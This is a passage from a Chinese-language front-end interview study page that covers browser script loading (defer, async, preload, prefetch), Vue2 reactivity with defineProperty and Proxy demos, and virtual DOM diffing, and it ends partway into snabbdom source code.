  document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'btn1'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token keyword">let</span> curWidth <span class="token operator">=</span> <span class="token number">100</span>
  <span class="token keyword">const</span> maxWidth <span class="token operator">=</span> <span class="token number">400</span>

  <span class="token keyword">function</span> <span class="token function">addWidth</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    curWidth <span class="token operator">=</span> curWidth <span class="token operator">+</span> <span class="token number">3</span>
    box<span class="token punctuation">.</span>style<span class="token punctuation">.</span>width <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>curWidth<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">px</span><span class="token template-punctuation string">`</span></span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>curWidth <span class="token operator">&lt;</span> maxWidth<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        window<span class="token punctuation">.</span><span class="token function">requestAnimationFrame</span><span class="token punctuation">(</span>addWidth<span class="token punctuation">)</span> <span class="token comment">// 时间不用自己控制</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token function">addWidth</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code>window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">'start'</span><span class="token punctuation">)</span>
  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">'timeout'</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token comment">// 空闲时间才执行</span>
  window<span class="token punctuation">.</span><span class="token function">requestIdleCallback</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">'requestIdleCallback'</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
  window<span class="token punctuation">.</span><span class="token function">requestAnimationFrame</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">'requestAnimationFrame'</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
  console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">'end'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token comment">// start</span>
<span class="token comment">// end</span>
<span class="token comment">// timeout</span>
<span class="token comment">// requestAnimationFrame</span>
<span class="token comment">// requestIdleCallback</span>
</code></pre></div><h3 id="script标签的defer和async有什么区别"><a href="#script标签的defer和async有什么区别" class="header-anchor">#</a> script标签的defer和async有什么区别</h3> <ul><li><code>script</code>：<code>HTML</code>暂停解析，下载<code>JS</code>，执行<code>JS</code>，在继续解析<code>HTML</code>。</li> <li><code>defer</code>：<code>HTML</code>继续解析，并行下载<code>JS</code>，<code>HTML</code>解析完在执行<code>JS</code>（不用把<code>script</code>放到<code>body</code>后面，我们在<code>head</code>中<code>&lt;script defer&gt;</code>让<code>js</code>脚本并行加载会好点）</li> <li><code>async</code>：<code>HTML</code>继续解析，并行下载<code>JS</code>，执行<code>JS</code>（<code>加载完毕后立即执行</code>），在继续解析<code>HTML</code> <ul><li>加载完毕后立即执行，这导致<code>async</code>属性下的脚本是乱序的，对于 <code>script</code> 有先后依赖关系的情况，并不适用</li></ul></li></ul> <blockquote><p>注意：<code>JS</code>是单线程的，<code>JS</code>解析线程和<code>DOM</code>解析线程共用同一个线程，<code>JS执行和HTML解析是互斥的</code>，加载资源可以并行</p></blockquote> <p><img alt="" data-src="https://s.poetries.work/images/20210314221335.png" loading="lazy" class="lazy"></p> <blockquote><p>蓝色线代表网络读取，红色线代表执行时间，这俩都是针对脚本的；绿色线代表 <code>HTML</code> 解析</p></blockquote> <p><strong>连环问：prefetch和dns-prefetch分别是什么</strong></p> <p><strong>preload和prefetch</strong></p> <ul><li><code>preload</code> 资源在当前页面使用，会优先加载</li> <li><code>prefetch</code> 资源在未来页面使用，空闲时加载</li></ul> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
  <span class="token comment">&lt;!-- 当前页面使用 --&gt;</span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>preload<span class="token punctuation">&quot;</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>style.css<span class="token punctuation">&quot;</span></span> <span class="token attr-name">as</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>style<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>preload<span class="token punctuation">&quot;</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>main.js<span class="token punctuation">&quot;</span></span> <span class="token attr-name">as</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>script<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>

  <span class="token comment">&lt;!-- 未来页面使用 提前加载 比如新闻详情页 --&gt;</span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>prefetch<span class="token punctuation">&quot;</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>other.js<span class="token punctuation">&quot;</span></span> <span class="token attr-name">as</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>script<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>

  <span class="token comment">&lt;!-- 当前页面 引用css --&gt;</span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>stylesheet<span class="token punctuation">&quot;</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>style.css<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
  <span class="token comment">&lt;!-- 当前页面 引用js --&gt;</span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>main.js<span class="token punctuation">&quot;</span></span> <span class="token attr-name">defer</span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p><strong>dns-preftch和preconnect</strong></p> <ul><li><code>dns-pretch</code> <code>DNS</code>预查询</li> <li><code>preconnect</code> <code>DNS</code>预连接</li></ul> <blockquote><p>通过预查询和预连接减少<code>DNS</code>解析时间</p></blockquote> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
  <span class="token comment">&lt;!-- 针对未来页面提前解析：提高打开速度 --&gt;</span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>dns-pretch<span class="token punctuation">&quot;</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>https://font.static.com<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>preconnect<span class="token punctuation">&quot;</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>https://font.static.com<span class="token punctuation">&quot;</span></span> <span class="token attr-name">crossorigin</span> <span class="token punctuation">/&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><h2 id="_4-vue2"><a href="#_4-vue2" class="header-anchor">#</a> 4 Vue2</h2> <h3 id="响应式原理"><a href="#响应式原理" class="header-anchor">#</a> 响应式原理</h3> <p><strong>响应式</strong></p> <ul><li>组件<code>data</code>数据一旦变化，立刻触发视图的更新</li> <li>实现数据驱动视图的第一步</li> <li>核心<code>API</code>：<code>Object.defineProperty</code> <ul><li><strong>缺点</strong> <ul><li>深度监听，需要递归到底，一次计算量大</li> <li>无法监听新增属性、删除属性（使用<code>Vue.set</code>、<code>Vue.delete</code>可以）</li> <li>无法监听原生数组，需要重写数组原型</li></ul></li></ul></li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 触发更新视图</span>
<span class="token keyword">function</span> <span class="token function">updateView</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'视图更新'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token comment">// 重新定义数组原型</span>
<span class="token keyword">const</span> oldArrayProperty <span class="token operator">=</span> <span class="token class-name">Array</span><span class="token punctuation">.</span>prototype
<span class="token comment">// 创建新对象，原型指向 oldArrayProperty ，再扩展新的方法不会影响原型</span>
<span class="token keyword">const</span> arrProto <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>oldArrayProperty<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">[</span><span class="token string">'push'</span><span class="token punctuation">,</span> <span class="token string">'pop'</span><span class="token punctuation">,</span> <span class="token string">'shift'</span><span class="token punctuation">,</span> <span class="token string">'unshift'</span><span class="token punctuation">,</span> <span class="token string">'splice'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">methodName</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    arrProto<span class="token punctuation">[</span>methodName<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">updateView</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 触发视图更新</span>
        oldArrayProperty<span class="token punctuation">[</span>methodName<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token operator">...</span>arguments<span class="token punctuation">)</span>
        <span class="token comment">// Array.prototype.push.call(this, ...arguments)</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>

<span class="token comment">// 重新定义属性，监听起来</span>
<span class="token keyword">function</span> <span class="token function">defineReactive</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// 深度监听</span>
    <span class="token function">observer</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>

    <span class="token comment">// 核心 API</span>
    Object<span class="token punctuation">.</span><span class="token function">defineProperty</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">,</span> <span class="token punctuation">{</span>
        <span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> value
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token function">set</span><span class="token punctuation">(</span>newValue<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>newValue <span class="token operator">!==</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token comment">// 深度监听</span>
                <span class="token function">observer</span><span class="token punctuation">(</span>newValue<span class="token punctuation">)</span>

                <span class="token comment">// 设置新值</span>
                <span class="token comment">// 注意，value 一直在闭包中，此处设置完之后，再 get 时也是会获取最新的值</span>
                value <span class="token operator">=</span> newValue

                <span class="token comment">// 触发更新视图</span>
                <span class="token function">updateView</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token comment">// 监听对象属性</span>
<span class="token keyword">function</span> <span class="token function">observer</span><span class="token punctuation">(</span><span class="token parameter">target</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> target <span class="token operator">!==</span> <span class="token string">'object'</span> <span class="token operator">||</span> target <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 不是对象或数组</span>
        <span class="token keyword">return</span> target
    <span class="token punctuation">}</span>

    <span class="token comment">// 污染全局的 Array 原型</span>
    <span class="token comment">// Array.prototype.push = function () {</span>
    <span class="token comment">//     updateView()</span>
    <span class="token comment">//     ...</span>
    <span class="token comment">// }</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        target<span class="token punctuation">.</span>__proto__ <span class="token operator">=</span> arrProto
    <span class="token punctuation">}</span>

    <span class="token comment">// 重新定义各个属性（for in 也可以遍历数组）</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> target<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">defineReactive</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">,</span> target<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// 准备数据</span>
<span class="token keyword">const</span> data <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'zhangsan'</span><span class="token punctuation">,</span>
    <span class="token literal-property property">age</span><span class="token operator">:</span> <span class="token number">20</span><span class="token punctuation">,</span>
    <span class="token literal-property property">info</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token literal-property property">address</span><span class="token operator">:</span> <span class="token string">'shenzhen'</span> <span class="token comment">// 需要深度监听</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token literal-property property">nums</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">]</span>
<span class="token punctuation">}</span>

<span class="token comment">// 监听数据</span>
<span class="token function">observer</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>

<span class="token comment">// 测试</span>
<span class="token comment">// data.name = 'lisi'</span>
<span class="token comment">// data.age = 21</span>
<span class="token comment">// // console.log('age', data.age)</span>
<span class="token comment">// data.x = '100' // 新增属性，监听不到 —— 所以有 Vue.set</span>
<span class="token comment">// delete data.name // 删除属性，监听不到 —— 所有已 Vue.delete</span>
<span class="token comment">// data.info.address = '上海' // 深度监听</span>
data<span class="token punctuation">.</span>nums<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token comment">// 监听数组</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// proxy-demo</span>

<span class="token comment">// const data = {</span>
<span class="token comment">//     name: 'zhangsan',</span>
<span class="token comment">//     age: 20,</span>
<span class="token comment">// }</span>
<span class="token keyword">const</span> data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">]</span>

<span class="token keyword">const</span> proxyData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Proxy</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token punctuation">{</span>
    <span class="token function">get</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">,</span> receiver<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 只处理本身（非原型的）属性</span>
        <span class="token keyword">const</span> ownKeys <span class="token operator">=</span> Reflect<span class="token punctuation">.</span><span class="token function">ownKeys</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>ownKeys<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'get'</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span> <span class="token comment">// 监听</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">const</span> result <span class="token operator">=</span> Reflect<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">,</span> receiver<span class="token punctuation">)</span>
        <span class="token keyword">return</span> result <span class="token comment">// 返回结果</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token function">set</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">,</span> val<span class="token punctuation">,</span> receiver<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 重复的数据，不处理</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">===</span> target<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">const</span> result <span class="token operator">=</span> Reflect<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">,</span> val<span class="token punctuation">,</span> receiver<span class="token punctuation">)</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'set'</span><span class="token punctuation">,</span> key<span class="token punctuation">,</span> val<span class="token punctuation">)</span>
        <span class="token comment">// console.log('result', result) // true</span>
        <span class="token keyword">return</span> result <span class="token comment">// 是否设置成功</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token function">deleteProperty</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token punctuation">,</span> key</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">const</span> result <span class="token operator">=</span> Reflect<span class="token punctuation">.</span><span class="token function">deleteProperty</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">)</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'delete property'</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span>
        <span class="token comment">// console.log('result', result) // true</span>
        <span class="token keyword">return</span> result <span class="token comment">// 是否删除成功</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><h3 id="vdom和diff算法"><a href="#vdom和diff算法" class="header-anchor">#</a> vdom和diff算法</h3> <p><strong>1. vdom</strong></p> <ul><li><strong>背景</strong> <ul><li><code>DOM</code>操作非常耗时</li> <li>以前用<code>jQuery</code>，可以自行控制<code>DOM</code>操作时机，手动调整</li> <li><code>Vue</code>和<code>React</code>是数据驱动视图，如何有效控制<code>DOM</code>操作</li></ul></li> <li><strong>解决方案VDOM</strong> <ul><li>有了一定的复杂度，想减少计算次数比较难</li> <li>能不能把计算，更多的转移为JS计算？因为<code>JS</code>执行速度很快</li> <li><code>vdom</code> 用<code>JS</code>模拟<code>DOM</code>结构，计算出最小的变更，操作<code>DOM</code></li></ul></li> <li><strong>用JS模拟DOM结构</strong><br> <img alt="" data-src="https://s.poetries.work/uploads/2023/02/34c8532904ffd12f.png" loading="lazy" class="lazy"></li> <li><strong>通过snabbdom学习vdom</strong> <ul><li>简洁强大的<code>vdom</code>库</li> <li><code>vue2</code>参考它实现的<code>vdom</code>和<code>diff</code></li> <li><strong>snabbdom</strong> <ul><li><code>h</code>函数</li> <li><code>vnode</code>数据结构</li> <li><code>patch</code>函数</li></ul></li></ul></li> <li><strong>vdom总结</strong> <ul><li>用<code>JS</code>模拟<code>DOM</code>结构（<code>vnode</code>）</li> <li>新旧<code>vnode</code>对比，得出最小的更新范围，有效控制<code>DOM</code>操作</li> <li>数据驱动视图模式下，有效控制<code>DOM</code>操作</li></ul></li></ul> <p><strong>2. diff算法</strong></p> <ul><li><code>diff</code>算法是<code>vdom</code>中最核心、最关键的部分</li> <li><code>diff</code>算法能在日常使用<code>vue</code> <code>react</code>中提现出来（如<code>key</code>）</li></ul> <p><strong>树的diff的时间复杂度O(n^3)</strong></p> <ul><li>第一，遍历<code>tree1</code></li> <li>第二，遍历<code>tree2</code></li> <li>第三，排序</li> <li><code>1000</code>个节点，要计算<code>1</code>亿次，算法不可用</li></ul> <p><strong>优化时间复杂度到O(n)</strong></p> <ul><li>只比较同一层级，不跨级比较</li> <li><code>tag</code>不相同，则直接删掉重建，不再深度比较</li> <li><code>tag</code>和<code>key</code>相同，则认为是相同节点，不再深度比较</li></ul> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/02/9e81506ea3345aea.png" loading="lazy" class="lazy"> <img alt="" data-src="https://s.poetries.work/uploads/2023/02/f304938694b28862.png" loading="lazy" class="lazy"></p> <p><strong>diff过程细节</strong></p> <ul><li>新旧节点都有<code>children</code>，执行<code>updateChildren</code> <code>diff</code>对比
<img alt="" data-src="https://s.poetries.work/uploads/2023/02/2a4ac0a956e99b22.png" loading="lazy" class="lazy"> <ul><li>开始和开始对比--头头</li> <li>结束和结束对比--尾尾</li> <li>开始和结束对比--头尾</li> <li>结束和开始对比--尾头</li> <li>以上四个都未命中：拿新节点 <code>key</code> ，能否对应上 <code>oldCh</code> 中的某个节点的 <code>key</code></li></ul></li> <li>新<code>children</code>有，旧<code>children</code>无：清空旧<code>text</code>节点，新增新<code>children</code>节点</li> <li>旧<code>children</code>有，新<code>children</code>无：移除旧<code>children</code></li> <li>否则旧<code>text</code>有，设置<code>text</code>为空</li></ul> <p><strong>vdom和diff算法总结</strong></p> <ul><li>细节不重要，<code>updateChildren</code>的过程也不重要，不要深究</li> <li><code>vdom</code>的核心概念很重要：<code>h</code>、<code>vnode</code>、<code>patch</code>、<code>diff</code>、<code>key</code></li> <li><code>vdom</code>存在的价值更重要，数据驱动视图，控制<code>dom</code>操作</li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// snabbdom源码位于 src/snabbdom.ts</span>
<span class="token comment">/* global module, document, Node */</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Module <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./modules/module'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> vnode<span class="token punctuation">,</span> <span class="token punctuation">{</span> VNode <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./vnode'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token operator">*</span> <span class="token keyword">as</span> is <span class="token keyword">from</span> <span class="token string">'./is'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> htmlDomApi<span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token constant">DOMAPI</span> <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./htmldomapi'</span><span class="token punctuation">;</span>

type NonUndefined<span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">&gt;</span> <span class="token operator">=</span> <span class="token constant">T</span> <span class="token keyword">extends</span> <span class="token class-name">undefined</span> <span class="token operator">?</span> never <span class="token operator">:</span> <span class="token constant">T</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">isUndef</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token literal-property property">s</span><span class="token operator">:</span> any</span><span class="token punctuation">)</span><span class="token operator">:</span> boolean <span class="token punctuation">{</span> <span class="token keyword">return</span> s <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span class="token keyword">function</span> isDef<span class="token operator">&lt;</span><span class="token constant">A</span><span class="token operator">&gt;</span> <span class="token punctuation">(</span>s<span class="token operator">:</span> <span class="token constant">A</span><span class="token punctuation">)</span><span class="token operator">:</span> s is NonUndefined<span class="token operator">&lt;</span><span class="token constant">A</span><span class="token operator">&gt;</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> s <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>

type VNodeQueue <span class="token operator">=</span> VNode<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> emptyNode <span class="token operator">=</span> <span class="token function">vnode</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">undefined</span><span class="token punctuation">,</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">sameVnode</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token literal-property property">vnode1</span><span class="token operator">:</span> VNode<span class="token punctuation">,</span> <span class="token literal-property property">vnode2</span><span class="token operator">:</span> VNode</span><span class="token punctuation">)</span><span class="token operator">:</span> boolean <span class="token punctuation">{</span>
  <span class="token comment">// key 和 sel 都相等</span>
  <span class="token comment">// undefined === undefined // true</span>
  <span class="token keyword">return</span> vnode1<span class="token punctuation">.</span>key <span class="token operator">===</span> vnode2<span class="token punctuation">.</span>key <span class="token operator">&amp;&amp;</span> vnode1<span class="token punctuation">.</span>sel <span class="token operator">===</span> vnode2<span class="token punctuation">.</span>sel<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">isVnode</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token literal-property property">vnode</span><span class="token operator">:</span> any</span><span class="token punctuation">)</span><span class="token operator">:</span> vnode is VNode <span class="token punctuation">{</span>
  <span class="token keyword">return</span> vnode<span class="token punctuation">.</span>sel <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

type KeyToIndexMap <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">[</span>key<span class="token operator">:</span> string<span class="token punctuation">]</span><span class="token operator">:</span> number<span class="token punctuation">}</span><span class="token punctuation">;</span>

type ArraysOf<span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">&gt;</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
  <span class="token punctuation">[</span><span class="token constant">K</span> <span class="token keyword">in</span> keyof <span class="token constant">T</span><span class="token punctuation">]</span><span class="token operator">:</span> Array<span class="token operator">&lt;</span><span class="token constant">T</span><span class="token punctuation">[</span><span class="token constant">K</span><span class="token punctuation">]</span><span class="token operator">&gt;</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

type ModuleHooks <span class="token operator">=</span> ArraysOf<span class="token operator">&lt;</span>Module<span class="token operator">&gt;</span><span class="token punctuation">;</span>

